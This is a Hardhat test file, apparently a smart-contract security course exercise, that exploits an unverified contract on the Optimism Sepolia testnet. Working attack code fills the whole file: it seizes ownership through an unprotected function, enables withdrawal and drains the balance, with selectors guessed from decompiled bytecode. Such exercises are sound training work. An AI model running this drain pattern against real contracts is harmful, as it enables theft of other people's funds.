import { ethers } from 'hardhat'
import { expect } from 'chai'
import { formatEther } from 'ethers'

describe('Exercise 3', () => {
  it('should drain unverified contract', async () => {
    const [exploiter] = await ethers.getSigners()
    const contractAddress = '0x65dcd95cf3aaafa432aBb2b7DcACc68911635349'

    /**
     * From Bytecode decompilation: https://sepolia-optimism.etherscan.io/bytecode-decompiler?a=0x65dcd95cf3aaafa432abb2b7dcacc68911635349
     * - We guess that the contract has a function that allows to update an owner address (0x2050c032(address,address))
     * - We guess that the contract has a function that allows the owner to enable withdrawal permission (0xa439753e(bool))
     * - We guess that the contract has a function that allows the owner to drain the contract (0x6709c991())
     */

    let tx

    // Step 1: Update owner address
    const currentOwnerAddress = await ethers.getAddress(
      '0x' + (await ethers.provider.getStorage(contractAddress, 0)).slice(-40)
    )
    console.log(
      `Updating owner address from ${currentOwnerAddress} to ${exploiter.address}...`
    )
    tx = await exploiter.sendTransaction({
      to: contractAddress,
      data: ethers.concat([
        '0x2050c032',
        ethers.AbiCoder.defaultAbiCoder().encode(
          ['address', 'address'],
          [currentOwnerAddress, exploiter.address]
        )
      ])
    })
    await tx.wait()
    const newOwnerAddress = await ethers.getAddress(
      '0x' + (await ethers.provider.getStorage(contractAddress, 0)).slice(-40)
    )
    console.log(`Owner address updated to ${newOwnerAddress}`)

    // Step 2: Enable withdrawal permission
    const withdrawalPermission =
      ((BigInt(await ethers.provider.getStorage(contractAddress, 0)) >>
        BigInt('160')) &
        1n) ===
      1n
    console.log(
      `Enabling withdrawal permission from ${withdrawalPermission} to true...`
    )
    tx = await exploiter.sendTransaction({
      to: contractAddress,
      data: ethers.concat([
        '0xa439753e',
        ethers.AbiCoder.defaultAbiCoder().encode(['bool'], [true])
      ])
    })
    await tx.wait()
    const newWithdrawalPermission =
      ((BigInt(await ethers.provider.getStorage(contractAddress, 0)) >>
        BigInt('160')) &
        1n) ===
      1n
    console.log(`Withdrawal permission set to ${newWithdrawalPermission}`)

    // Step 3: Drain contract balance
    const contractBalanceBeforeAttack = await ethers.provider.getBalance(
      contractAddress
    )
    console.log(`Draining ${formatEther(contractBalanceBeforeAttack)} ETH...`)
    tx = await exploiter.sendTransaction({
      to: contractAddress,
      data: '0x6709c991'
    })
    await expect(tx).to.changeEtherBalances(
      [exploiter.address, contractAddress],
      [contractBalanceBeforeAttack, -contractBalanceBeforeAttack]
    )
    const contractBalanceAfterAttack = await ethers.provider.getBalance(
      contractAddress
    )
    console.log(
      `Contract balance after attack: ${formatEther(
        contractBalanceAfterAttack
      )}`
    )
  })
})
